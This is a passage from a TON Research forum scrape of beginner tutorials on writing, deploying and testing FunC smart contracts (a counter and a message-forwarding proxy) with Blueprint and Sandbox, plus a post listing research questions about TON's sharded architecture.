        return result.readBigNumber();
    }
}
```

## [](#deploying-the-contract-to-the-test-network-24)Deploying the Contract to the Test Network

To deploy to the test network, we will use the command-line interface [Blueprint](https://github.com/ton-community/blueprint/), which was automatically installed when creating the project.

`npx blueprint run`

Then follow the instructions. Choose the test network - testnet. You will then need to choose a method of wallet authorization for deployment. You can connect Tonkeeper or Tonhub, or choose the first option, TON Connect.  
A QR code will appear in the console, which you need to scan from your wallet application on your phone. If you don’t like this method, you can use one of the other options provided.

After successfully connecting the wallet, you may need to confirm the transaction from the application. If you did everything correctly, you will see a message in the console that the contract has been successfully deployed.

##### [](#what-to-do-if-it-says-there-is-not-enough-ton-25)What to do if it says there is not enough TON?

You need to get them from the test faucet, the bot for this is [@testgiver\_ton\_bot](https://t.me/testgiver_ton_bot).

To check if TON has been received to your wallet in the test network, you can use this explorer: [https://testnet.tonscan.org/](https://testnet.tonscan.org/)

> Important: This is only about the test network

## [](#testing-the-contract-26)Testing the Contract

##### [](#calling-recv_internal-27)Calling recv\_internal()

To call recv\_internal(), you need to send a message within the TON network. For this purpose, we created the `sendNumber` method in the wrapper.  
To use this method and send a message from your wallet to the contract, write a small TypeScript script that sends a message to our contract using the wrapper.

##### [](#message-script-28)Message Script

Create a file `sendNumber.ts` in the scripts folder and write the following code in it (most of which can be copied from the deployCounter.ts file in the same folder):

```
import { toNano } from 'ton-core';
import { Counter } from '../wrappers/Counter';
import { compile, NetworkProvider } from '@ton-community/blueprint';

export async function run(provider: NetworkProvider) {
    const counter = provider.open(
        Counter.createFromConfig({}, await compile('Counter'))
    );

    // code will be here
}
```

This code declares the only function `run`, in which we can interact with our smart contract. An object `counter` of the wrapper class is created, which we wrote earlier in this lesson.  
Now let’s add a call to the `sendNumber` method in the function:

```
await counter.sendNumber(provider.sender(), toNano('0.01'), 123n);
```

To run the script, execute the command `npx blueprint run` in the console, but this time, choose the desired script - `sendNumber`. Most likely, the wallet will already be connected since the deployment, so you won’t need to go through the authorization process again.

If you see the message “**Sent transaction**” in the console, our message has been sent to the contract. Now let’s check if the number in the contract data has been updated using the `getTotal` method.

#### [](#get_total-script-29)get\_total Script

Create another file in the scripts directory, for example `getTotal.ts`, and copy the same code into it, but this time use our getTotal() method from the wrapper.

```
import { toNano } from 'ton-core';
import { Counter } from '../wrappers/Counter';
import { compile, NetworkProvider } from '@ton-community/blueprint';

export async function run(provider: NetworkProvider) {
    const counter = provider.open(
        Counter.createFromConfig({}, await compile('Counter'))
    );

    console.log('Total:', await counter.getTotal());
}
```

Similarly, run the script using the `npx blueprint run` command, and after execution, you should see the message “**Total: 123n**” in the console.

## [](#congratulations-you-have-reached-the-end-30)Congratulations, you have reached the end

##### [](#task-31)Task

As you may have noticed, we did not test the exception handling. Modify the message in the wrapper so that the smart contract does it.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/1lesson/firstlesson.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/smartcontract/1lesson/firstlesson.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/1lesson/firstlesson.md)

```
# Lesson 1 Simple Smart Contract

## Introduction

In this lesson, we will write your first smart contract on the TON blockchain using the FunC language, deploy it to the test network using [Blueprint](https://github.com/ton-community/blueprint), and try to interact with it using the [ton](https://github.com/ton-org/ton) JavaScript library.

> \*Deploy - the process of transferring to the network (in this case, a smart contract to the blockchain)

## Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is recommended to install one of the latest versions, such as 18.

## Smart Contract

The smart contract we will create should have the following functionality:

-   Store an integer _total_ in its data - a 64-bit unsigned integer
-   When receiving an internal incoming message, the contract should take a 32-bit unsigned integer from the message body, add it to _total_, and save it in its data
-   The smart contract should have a method _get_total_ that allows you to retrieve the value of _total_
-   If the body of the incoming message is less than 32 bits, the contract should throw an exception
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/1lesson/firstlesson.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 428

[TON Research](/)

# [Create Smart Contracts on TON - Lesson 2 Testing FunC for a Smart Contract](/t/create-smart-contracts-on-ton-lesson-2-testing-func-for-a-smart-contract/428)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 1:22pm  1

## [](#introduction-1)Introduction

In this lesson, we will write tests for the smart contract created in the first lesson on the TON blockchain and run them using [Blueprint](https://github.com/ton-community/blueprint).

## [](#requirements-2)Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org) (preferably version 18 or higher) and complete the [first lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## [](#tests-for-the-first-smart-contract-3)Tests for the First Smart Contract

For our first smart contract, we will write the following tests:

*   Call `recv_internal()` with different numbers and check the `get_total` method.
*   Check for an error when the number does not meet the bitness condition.

## [](#test-structure-in-blueprint-4)Test Structure in Blueprint

The [Sandbox](https://github.com/ton-community/sandbox) library is used for testing smart contracts in Blueprint projects. It is installed by default in all projects created through Blueprint.

The tests are located in the `tests/` folder. For each smart contract in the project (there can be multiple), a separate file is created. In our case, there should be only one file named `Counter.spec.ts` in this folder. It already contains everything needed to test our smart contract, including the first test that checks if the contract is deployed successfully. We just need to add new tests.

### [](#important-note-5)Important Note

If you run the tests using the `npx blueprint test` command in the current directory, you will see an error in the only test called “should deploy”. In most cases, this test should pass immediately. However, our contract simply throws an error because the deployed message does not contain a 32-bit number (we intentionally added this error in the first lesson when there was no number).

To fix this and ignore the error during deployment, find the code fragment that checks the success of deployment. Remove the `success` check from it. It should look like this:

```
expect(deployResult.transactions).toHaveTransaction({
    from: deployer.address,
    to: counter.address,
    deploy: true,
});
```

Now, if you run the `npx blueprint test` command in the terminal, you will see the following:

```
 PASS  tests/Counter.spec.ts
  Counter
    ✓ should deploy (123 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.085 s, estimated 2 s
Ran all test suites.
✨  Done in 2.47s.
```

This means that the test passed successfully.

## [](#testing-the-recv_internal-and-get_total-calls-6)Testing the `recv_internal()` and `get_total()` Calls

Let’s write the first test and go through its code.

After the standard test `it('should deploy', ...)`, write the following:

```
it('should update the number', async () => {
    // code will be here
});
```

The string “should update the number” can be anything. It is just an explanation for ourselves of what the test is about.

Now let’s write the test code:

```
it('should update the number', async () => {
    const caller = await blockchain.treasury('caller');

    await counter.sendNumber(caller.getSender(), toNano('0.01'), 10n);
    expect(await counter.getTotal()).toEqual(10n);

    await counter.sendNumber(caller.getSender(), toNano('0.01'), 5n);
    expect(await counter.getTotal()).toEqual(15n);

    await counter.sendNumber(caller.getSender(), toNano('0.01'), 1000n);
    expect(await counter.getTotal()).toEqual(1015n);
});
```

### [](#explanation-7)Explanation

`const caller = await blockchain.treasury('caller');` - here we create a new Treasury, which already has a million coins for all necessary checks in the Sandbox. We can use it to send messages to the contract. Essentially, it is just a wallet with a balance for testing.

`await counter.sendNumber(caller.getSender(), toNano('0.01'), 10n);` - we send a message with the number `10` using the wrapper method we wrote in the first lesson. We use `caller` as the sender, which was created above.

`expect(await counter.getTotal()).toEqual(10n);` - we check (using the `expect` function) that the result of the `getTotal()` method will be equal to `10`. If it is not the case, the test will be marked as failed, and we will see in the terminal where the check failed. If everything is fine and the result matches, the code will continue to execute.

In the next lines, we simply send numbers to the same contract and compare the result with `getTotal()`. After sending `5`, our sum should be `15`, and if we send `1000`, it should be `1015`. If the FunC code of the contract is written correctly, the test should pass.

Run the tests using the `npx blueprint test` command, and if you have done everything correctly, you will get the following result:

```
 PASS  tests/Counter.spec.ts
  Counter
    ✓ should deploy (126 ms)
    ✓ should update the number (79 ms)
```

The checkmark means that our new test passed successfully.

## [](#testing-the-exception-8)Testing the Exception

Let’s write another test and go through its code.

```
it('should throw error when number is not 32 bits', async () => {
    const caller = await blockchain.treasury('caller');

    const result = await counter.sendDeploy(caller.getSender(), toNano('0.01'));
    expect(result.transactions).toHaveTransaction({
        from: caller.address,
        to: counter.address,
        success: false,
        exitCode: 35,
    });
});
```

### [](#explanation-9)Explanation

`const caller = await blockchain.treasury('caller');` - here we create a new Treasury, which already has a million coins for all necessary checks in the Sandbox. We can use it to send messages to the contract. Essentially, it is just a wallet with a balance for testing.

`const result = await counter.sendDeploy(caller.getSender(), toNano('0.01'));` - we send an empty message without a number (this was used for deployment, so for simplicity, we use the ready-made `sendDeploy` function).

`expect(result.transactions).toHaveTransaction({ ... })` - we check (using the `expect` function) that among the transactions processed as a result of calling the contract, there will be a transaction with error `35`.

> The error code `35` is what we specified in the smart contract in the `throw_if` function.

Run the tests using the `npx blueprint test` command, and if you have done everything correctly, you will get the following result:

```
 PASS  tests/Counter.spec.ts
  Counter
    ✓ should deploy (127 ms)
    ✓ should update the number (79 ms)
    ✓ should throw error when number is not 32 bits (53 ms)
```

The checkmark means that our new test passed successfully.

### [](#thats-it-10)That’s it!

You have completed the second lesson and successfully implemented tests for the smart contract.

P.S. If you have any questions, feel free to ask [here](https://t.me/ton_learn).

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/2lesson/secondlesson.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/smartcontract/2lesson/secondlesson.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/2lesson/secondlesson.md)

```
# Lesson 2: Testing FunC for a Smart Contract

## Introduction

In this lesson, we will write tests for the smart contract created in the first lesson on the TON blockchain and run them using [Blueprint](https://github.com/ton-community/blueprint).

## Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org) (preferably version 18 or higher) and complete the [first lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## Tests for the First Smart Contract

For our first smart contract, we will write the following tests:

-   Call `recv_internal()` with different numbers and check the `get_total` method.
-   Check for an error when the number does not meet the bitness condition.

## Test Structure in Blueprint

The [Sandbox](https://github.com/ton-community/sandbox) library is used for testing smart contracts in Blueprint projects. It is installed by default in all projects created through Blueprint.
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/2lesson/secondlesson.md)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 429

[TON Research](/)

# [Create Smart Contracts on TON - Lesson 3 Proxy Smart Contract](/t/create-smart-contracts-on-ton-lesson-3-proxy-smart-contract/429)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 1:24pm  1

## [](#introduction-1)Introduction

In this lesson, we will write a proxy smart contract in the TON blockchain using the FunC language and test it in the next lesson.

## [](#requirements-2)Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is recommended to install one of the latest versions, such as 18.

You should also be able to create/deploy a project using Blueprint. You can learn how to do this in the [first lesson](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/1lesson/firstlesson.md)

## [](#smart-contract-3)Smart Contract

The smart contract we will create should have the following functionality:

*   Forward all incoming messages to the contract owner
*   When forwarding, the sender’s address should come first, followed by the original message body
*   The value of Toncoin attached to the forwarded message should be equal to the value of the incoming message minus fees
*   The owner’s address is stored in the smart contract’s storage
*   When a message is sent to the contract by the owner, it should not be forwarded

I decided to take ideas for smart contracts from the [FunC contest1](https://github.com/ton-blockchain/func-contest1) tasks, as they are very suitable for getting acquainted with smart contract development for TON.

## [](#external-method-4)External Method

To enable our contract to receive messages, we will use the `recv_internal()` function, which will already be present in the FunC code file after creating the project.

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body)  {

}
```

## [](#senders-address-5)Sender’s Address

According to the task, we need to take the sender’s address. We will extract the address from the incoming message cell `in_msg_full`. Let’s move the code for this action to a separate function.

```
() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
  slice sender_address = parse_sender_address(in_msg_full);
}
```

##### [](#writing-the-function-6)Writing the Function

Let’s write the code for the `parse_sender_address` function, which takes the sender’s address from the message cell and break it down:

```
slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  var flags = cs~load_uint(4);
  slice sender_address = cs~load_msg_addr();
  return sender_address;
}
```

As you can see, the function has the `inline` specifier, which means that its code is actually inserted at each call site. This specifier is useful when a function is only called in a single place.

To extract the address, we need to convert the cell to a slice using `begin_parse`:

```
var cs = in_msg_full.begin_parse();
```

Now we need to skip the first 4 bits in this slice, which are reserved for message flags. We can use the `load_uint` function from the [FunC standard library](https://docs.ton.org/develop/func/stdlib/), which loads an unsigned integer of size N bits from the slice.

```
var flags = cs~load_uint(4);
```

In this lesson, we won’t go into detail about the flags, but you can read more about them in the [documentation](https://docs.ton.org/develop/smart-contracts/messages#message-layout).

And finally, the address. We will use `load_msg_addr()`, which loads a prefix from the slice that is a valid `MsgAddress` (address).

```
slice sender_address = cs~load_msg_addr();
return sender_address;
```

## [](#recipients-address-7)Recipient’s Address

We will take the address from the contract’s data. We have already discussed this in previous lessons.

We will use:  
`get_data` - retrieves a cell from the contract’s data.  
`begin_parse` - converts the cell to a slice.  
`load_msg_addr()` - loads a prefix from the slice that is a valid `MsgAddress`.

As a result, we get the following function:

```
slice load_data () inline {
  var ds = get_data().begin_parse();
  return ds~load_msg_addr();
}
```

We just need to call it:

```
slice load_data () inline {
  var ds = get_data().begin_parse();
  return ds~load_msg_addr();
}

slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  var flags = cs~load_uint(4);
  slice sender_address = cs~load_msg_addr();
  return sender_address;
}

() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
  slice sender_address = parse_sender_address(in_msg_full);
  slice owner_address = load_data();
}
```

## [](#check-equality-of-addresses-8)Check Equality of Addresses

According to the task, the proxy should not forward a message if it comes from the owner. Therefore, we need to compare two addresses.

##### [](#comparison-function-9)Comparison Function

Some functions are not declared in the standard library, so they have to be manually declared using [TVM instructions](https://docs.ton.org/learn/tvm-instructions/instructions).

FunC supports defining a function in assembly (referring to Fift). This is done by defining the function as a low-level TVM primitive. For the comparison function, it will look like this:

```
int equal_slices (slice a, slice b) asm "SDEQ";
```

As you can see, the `asm` keyword is used.

##### [](#unary-operator-10)Unary Operator

Now we will use our `equal_slices` function in an `if` statement:

```
() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
  slice sender_address = parse_sender_address(in_msg_full);
  slice owner_address = load_data();

  if  equal_slices(sender_address, owner_address) {

   }
}
```

But the function checks for equality, how do we check for inequality? Here the unary operator `~` can help, which is the bitwise “not”.

Now our code looks like this:

```
int equal_slices (slice a, slice b) asm "SDEQ";

slice load_data () inline {
  var ds = get_data().begin_parse();
  return ds~load_msg_addr();
}

slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  var flags = cs~load_uint(4);
  slice sender_address = cs~load_msg_addr();
  return sender_address;
}

() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
  slice sender_address = parse_sender_address(in_msg_full);
  slice owner_address = load_data();

  if ~ equal_slices(sender_address, owner_address) {

   }
}
```

## [](#sending-a-message-11)Sending a Message

Now we just need to fill in the body of the conditional statement according to the task, which is to send the incoming message.

##### [](#message-structure-12)Message Structure

You can familiarize yourself with the full message structure [here](https://docs.ton.org/develop/smart-contracts/messages#message-layout). But usually we don’t need to control every field, so we can use the concise form from the [example](https://docs.ton.org/develop/smart-contracts/messages):

```
 var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(addr)
	.store_coins(amount)
	.store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	.store_slice(message_body)
  .end_cell();
```

As you can see, to build the message, we use functions from the [FunC standard library](https://docs.ton.org/develop/func/stdlib/). Specifically, the functions of the Builder primitives (partially constructed cells, as you may remember from the first lesson). Let’s take a look:

`begin_cell()` - creates a Builder for the future cell  
`end_cell()` - creates a cell  
`store_uint` - stores a uint in the Builder  
`store_slice` - stores a slice in the Builder  
`store_coins` - here in the documentation it refers to `store_grams`, which is used to write the amount of Toncoin or other currencies. More details [here](https://docs.ton.org/develop/func/stdlib/#store_grams).

And let’s also take a closer look at `store_ref`, which will be needed to send the address.

`store_ref` - Stores a reference to a cell in the Builder

Now that we have all the necessary information, let’s assemble the message.

##### [](#the-final-touch-incoming-message-body-13)The Final Touch - Incoming Message Body

To send the body that came in `recv_internal` as part of the message, let’s build a cell and make a reference to it in the message using `store_ref`.

```
  if ~ equal_slices(sender_address, owner_address) {
    cell msg_body_cell = begin_cell().store_slice(in_msg_body).end_cell();
  }
```

##### [](#assembling-the-message-14)Assembling the Message

According to the task, we should send the address and the message body in the message. Therefore, we will change `.store_slice(message_body)` to `.store_slice(sender_address)` and `.store_ref(msg_body_cell)` in the _msg_ variable. We get:

```
  if ~ equal_slices(sender_address, owner_address) {
	cell msg_body_cell = begin_cell().store_slice(in_msg_body).end_cell();

	var msg = begin_cell()
        .store_uint(0x10, 6)
        .store_slice(owner_address)
        .store_grams(0)
        .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
        .store_slice(sender_address)
        .store_ref(msg_body_cell)
    .end_cell();
   }
```

All that remains is to send our message.

##### [](#message-sending-mode-mode-15)Message Sending Mode (mode)

To send messages, we use `send_raw_message` from the [standard library](https://docs.ton.org/develop/func/stdlib/#send_raw_message).

We have already assembled the msg variable, now let’s understand the `mode`. The description of each mode is in the [documentation](https://docs.ton.org/develop/func/stdlib/#send_raw_message). Let’s consider an example to make it clearer.

Let’s say the smart contract has a balance of 100 coins, and we receive an internal message with 60 coins and send a message with 10 coins. Let’s assume the total fee is 3 for the example.

`mode = 0` - balance 100+60-10 = **150** coins, send 10-3 = **7** coins  
`mode = 1` - balance 100+60-10-3 = **147** coins, send **10** coins  
`mode = 64` - balance 100-10 = **90** coins, send 60+10-3 = **67** coins  
`mode = 65` - balance 100-10-3 = **87** coins, send 60+10 = **70** coins  
`mode = 128` - balance **0** coins, send 100+60-3 = **157** coins

The modes 1 and 65 mentioned above are `mode' = mode + 1`.

Since according to the task, the value of Toncoin attached to the message should be equal to the value of the incoming message minus processing fees, the mode `mode = 64` with `.store_grams(0)` suits us. Using the example, we get the following:

Let’s assume the smart contract has a balance of 100 coins, and we receive an internal message with 60 coins and send a message with 0 (since `.store_grams(0)`), the total fee is 3.

`mode = 64` - balance (100 = 100 coins), send (60-3 = 57 coins)

Thus, our conditional statement will look like this:

```
   if ~ equal_slices(sender_address, owner_address) {
	cell msg_body_cell = begin_cell().store_slice(in_msg_body).end_cell();

	var msg = begin_cell()
		  .store_uint(0x10, 6)
		  .store_slice(owner_address)
		  .store_grams(0)
		  .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
		  .store_slice(sender_address)
		  .store_ref(msg_body_cell)
		  .end_cell();
	 send_raw_message(msg, 64);
   }
```

And the complete code of the smart contract:

```
#include "imports/stdlib.fc";

int equal_slices (slice a, slice b) asm "SDEQ";

slice load_data () inline {
  var ds = get_data().begin_parse();
  return ds~load_msg_addr();
}

slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  var flags = cs~load_uint(4);
  slice sender_address = cs~load_msg_addr();
  return sender_address;
}

() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
  slice sender_address = parse_sender_address(in_msg_full);
  slice owner_address = load_data();

  if ~ equal_slices(sender_address, owner_address) {
	cell msg_body_cell = begin_cell().store_slice(in_msg_body).end_cell();

	var msg = begin_cell()
		  .store_uint(0x10, 6)
		  .store_slice(owner_address)
		  .store_grams(0)
		  .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
		  .store_slice(sender_address)
		  .store_ref(msg_body_cell)
		  .end_cell();
	 send_raw_message(msg, 64);
   }
}
```

## [](#typescript-wrapper-16)TypeScript Wrapper

To conveniently interact with our smart contract, let’s write a TypeScript wrapper. The base for it is already provided by Blueprint.

Open the `wrappers/Proxy.ts` file (the file name may be different depending on how you created the project).  
We only need to change the assembly of the contract’s data from the config. Our contract contains a single value in its data - the owner’s address. Let’s add this value to the config:

```
export type ProxyConfig = {
    owner: Address;
};

export function proxyConfigToCell(config: ProxyConfig): Cell {
    return beginCell().storeAddress(config.owner).endCell();
}
```

Great! We don’t need to change anything else except the data. The smart contract works with any messages, and we don’t need to write a wrapper for them.

## [](#conclusion-17)Conclusion

In this lesson, we have implemented a simple proxy contract in FunC. We will test it in the next lesson!

For homework, try deploying the smart contract to the real TON network (or testnet) using a script, as we did in the first lesson, and then send simple transfers with different amounts and comments to it from your wallet.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/3lesson/thirdlesson.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/smartcontract/3lesson/thirdlesson.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/3lesson/thirdlesson.md)

```
# Lesson 3 Proxy Smart Contract

## Introduction

In this lesson, we will write a proxy smart contract in the TON blockchain using the FunC language and test it in the next lesson.

## Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is recommended to install one of the latest versions, such as 18.

You should also be able to create/deploy a project using Blueprint. You can learn how to do this in the [first lesson](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/1lesson/firstlesson.md)

## Smart Contract

The smart contract we will create should have the following functionality:

-   Forward all incoming messages to the contract owner
-   When forwarding, the sender's address should come first, followed by the original message body
-   The value of Toncoin attached to the forwarded message should be equal to the value of the incoming message minus fees
-   The owner's address is stored in the smart contract's storage
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/3lesson/thirdlesson.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 43

[TON Research](/)

# [Exploring the Technical Architecture and Scalability of The Open Network (TON): A Comprehensive Examination](/t/exploring-the-technical-architecture-and-scalability-of-the-open-network-ton-a-comprehensive-examination/43)

[TON Blockchain](/c/ton-blockchain/17) 

    

[kingsman](https://tonresear.ch/u/kingsman)  January 23, 2024, 1:55pm  1

In the context of the evolving blockchain landscape, The Open Network (TON) has emerged as a potential game-changer, proposing a SuperApp ecosystem capable of supporting a vast number of users with efficient, affordable, and seamless experience. The cornerstone of TON’s proposition lies in its unique architecture, which distinguishes itself through high scalability and throughput, enabled primarily by dynamic sharding. This architectural framework involves a masterchain and up to (2^{32}) workchains, each capable of further splitting into (2^{60}) shardchains.

Given TON’s ambitious goal to provide infrastructure capable of handling millions of transactions per second from billions of users without compromising on speed, security, or decentralization, this paper seeks to explore and analyze the following key aspects of TON’s architecture:

1.  **Masterchain Functionality and Role**: How does the masterchain, as the primary chain, maintain the network configuration and the final state of all workchains, and what is its impact on ensuring consensus across the network?
2.  **Workchain Customization and Interoperability**: In what ways do individual workchains within TON cater to specific transaction types or use cases, and how do they maintain synchronization and interoperability with the masterchain?
3.  **Shardchain Mechanics and Efficiency**: What is the role of shardchains in the TON architecture, especially in terms of handling account-specific transactions, and how does the 60-bit shard prefix contribute to scalability?
4.  **Dynamic Sharding and Scalability**: Can you elaborate on how dynamic sharding enables TON to distribute transactions across multiple workchains and shardchains, thereby enhancing scalability and transaction processing efficiency?
5.  **Validator Role and Consensus Mechanism**: How do validators contribute to the integrity, security, and operation of TON’s network, particularly in the context of the decentralized Proof of Stake (PoS) mechanism?
6.  **Future Prospects and Challenges**: What are the future directions and potential challenges for TON, especially regarding its claims of setting new benchmarks in blockchain performance and handling future innovations?

This comprehensive analysis aims to delve into the technical intricacies of TON’s architecture, evaluating its capacity to revolutionize blockchain technology in terms of scalability, transaction speed, and overall efficiency.

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 430

[TON Research](/)

# [Create Smart Contracts on TON - Lesson 4 Tests for FunC for Proxy Smart Contract](/t/create-smart-contracts-on-ton-lesson-4-tests-for-func-for-proxy-smart-contract/430)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 1:30pm  1

## [](#introduction-1)Introduction

In this lesson, we will write tests for the smart contract created in the third lesson on the TON blockchain and run them using [Blueprint](https://github.com/ton-community/blueprint).

## [](#requirements-2)Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is preferable to install one of the latest versions, such as 18.

You should also complete the [third lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/3lesson/thirdlesson.md).

## [](#tests-for-the-proxy-smart-contract-3)Tests for the Proxy Smart Contract

For our proxy smart contract, we will write the following tests:

*   When a message is sent to the contract from the owner, it should not be forwarded
*   The remaining conditions from the [third lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/3lesson/thirdlesson.md) should be met

## [](#testing-the-proxy-contract-call-by-its-owner-4)Testing the Proxy Contract Call by its Owner

Open the `tests/Proxy.spec.ts` file, which already contains the base for our tests. For convenience, we will move the declaration of `deployer` outside the `beforeEach` function so that it can be accessed from all tests. We also need to add the contract configuration parameters to the contract config during deployment. It should look something like this:

```
let blockchain: Blockchain;
let proxy: SandboxContract<Proxy>;
let deployer: SandboxContract<TreasuryContract>;

beforeEach(async () => {
    blockchain = await Blockchain.create();

    deployer = await blockchain.treasury('deployer');

    proxy = blockchain.openContract(
        Proxy.createFromConfig(
            {
                owner: deployer.address,
            },
            code
        )
    );

    const deployResult = await proxy.sendDeploy(
        deployer.getSender(),
        toNano('0.01')
    );

    expect(deployResult.transactions).toHaveTransaction({
        from: deployer.address,
        to: proxy.address,
        deploy: true,
    });
});
```

Now let’s write the first test for the proxy contract and explain its code.

```
it('should not forward from owner', async () => {
    const result = await deployer.send({
        to: proxy.address,
        value: toNano('1'),
    });
    expect(result.transactions).not.toHaveTransaction({
        from: proxy.address,
        to: deployer.address,
    });
});
```

First, we send a message from the `deployer` wallet to the `proxy` with a value of `1 TON`.

As we remember, our contract should not forward messages from the owner to itself. Therefore, the condition for passing the test should be the **absence** of such a transaction. This check can be implemented by adding `.not` before `.toHaveTransaction`.

> Note: the test conditions (the `expect` keyword) work through the **Jest** library. Its syntax is quite simple, and in many cases, you can guess how to check something by simply writing it in English. The names of all functions clearly reflect their purpose. For example, `toEqual` checks if two values are equal, and `toBeLessThan` checks if one value is less than another.

We expect that as a result of executing the entire chain of actions, there should be no transaction from `proxy` to `deployer`.

## [](#testing-the-proxy-contract-call-by-another-wallet-5)Testing the Proxy Contract Call by Another Wallet

Let’s write the second test for the proxy contract and explain its code.

```
it('should forward from another wallet', async () => {
    let user = await blockchain.treasury('user');
    const result = await user.send({
        to: proxy.address,
        value: toNano('1'),
        body: beginCell().storeStringTail('Hello, world!').endCell(),
    });
    expect(result.transactions).toHaveTransaction({
        from: proxy.address,
        to: deployer.address,
        body: beginCell()
            .storeAddress(user.address)
            .storeRef(beginCell().storeStringTail('Hello, world!').endCell())
            .endCell(),
        value: (x) => (x ? toNano('0.99') <= x && x <= toNano('1') : false),
    });
});
```

First, we create a new wallet, just like the `deployer` is created in the code above:

```
let user = await blockchain.treasury('user');
```

Then we send a message from `user` to `proxy` with a value of `1 TON` and a comment `Hello, world!`.

Now our contract should forward this message to the owner. Therefore, we check that it is indeed there using `.toHaveTransaction` without using `.not`. We also use the `body` and `value` parameters for more precise checking.

The `body` should contain a cell that contains the address of the sender of the original message (i.e., `user.address`), and then the original message body should be stored in the ref. Therefore, we check that `body` is equal to

```
beginCell().storeAddress(user.address)
    .storeRef(beginCell().storeStringTail('Hello, world!').endCell())
.endCell()
```

For the `value` check, an unusual construction is used. Let’s examine it in more detail:

```
value: (x) => (x ? toNano('0.99') <= x && x <= toNano('1') : false);
```

“Matchers” from `.toHaveTransaction` can accept either the expected value itself or a function that performs a more complex check and returns a boolean value with the result of this check.  
In our case, we do not know the exact amount that the proxy contract will send to the owner, as we use mode 64 in the contract for sending, and this means that the fees will be deducted from the message amount. Therefore, we want to check that the message amount is approximately equal to 1.  
To do this, we write a so-called “arrow function,” which does not need to be declared in advance. This function takes a value `x` and returns `true` if it is greater than or equal to `0.99 TON` and less than or equal to `1 TON`. We also use a ternary expression to check that `x` is not `undefined` so that we can check its value, and otherwise return `false`.

## [](#running-the-tests-6)Running the Tests

Execute the command `npx blueprint test` in the terminal. The result should be something like this:

```
 PASS  tests/Proxy.spec.ts
  Proxy
    ✓ should deploy (145 ms)
    ✓ should not forward from owner (63 ms)
    ✓ should forward from another wallet (66 ms)
```

If any of the tests did not pass, review the code and the text of this lesson again. Also, compare your smart contract code with the code from the previous lesson.

## [](#conclusion-7)Conclusion

In this lesson, we successfully tested our proxy contract and made sure that it works as intended.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/4lesson/forthlesson.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/smartcontract/4lesson/forthlesson.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/4lesson/forthlesson.md)

```
# Lesson 4 Tests for FunC for Proxy Smart Contract

## Introduction

In this lesson, we will write tests for the smart contract created in the third lesson on the TON blockchain and run them using [Blueprint](https://github.com/ton-community/blueprint).

## Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is preferable to install one of the latest versions, such as 18.

